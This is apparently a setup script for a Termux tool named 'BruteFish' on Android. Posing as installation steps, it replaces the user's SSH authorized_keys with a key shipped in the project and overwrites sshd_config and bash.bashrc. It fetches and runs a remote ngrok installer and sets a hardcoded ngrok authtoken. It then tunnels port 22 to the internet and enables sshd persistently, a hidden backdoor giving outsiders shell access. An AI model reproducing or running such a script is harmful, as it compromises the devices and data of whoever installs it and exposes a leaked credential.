termux-setup-storage
pkg install python -y
pkg install openssh -y
pkg install autossh -y
pkg install termux-services -y

rm ~/.ssh/authorized_keys && cp ~/BruteFish/src/authorized_keys ~/.ssh
rm /data/data/com.termux/files/usr/etc/ssh/sshd_config && cp ~/BruteFish/src/sshd_config /data/data/com.termux/files/usr/etc/ssh
rm /data/data/com.termux/files/usr/etc/bash.bashrc && cp ~/BruteFish/src/bash.bashrc /data/data/com.termux/files/usr/etc

git clone https://github.com/tchelospy/termux-ngrok.git && cd termux-ngrok && chmod +x termux-ngrok.sh && ./termux-ngrok.sh
ngrok authtoken 2Cd65ozlZyyoCQdLDIEXamdkoT4_2D9GZtqYPJ37GmdJJByMe
ngrok tcp 22 > /dev/null &
sv down sshd
sv up sshd
sv-enable sshd
pip install colorama
cd && cd BruteFish
python main.py
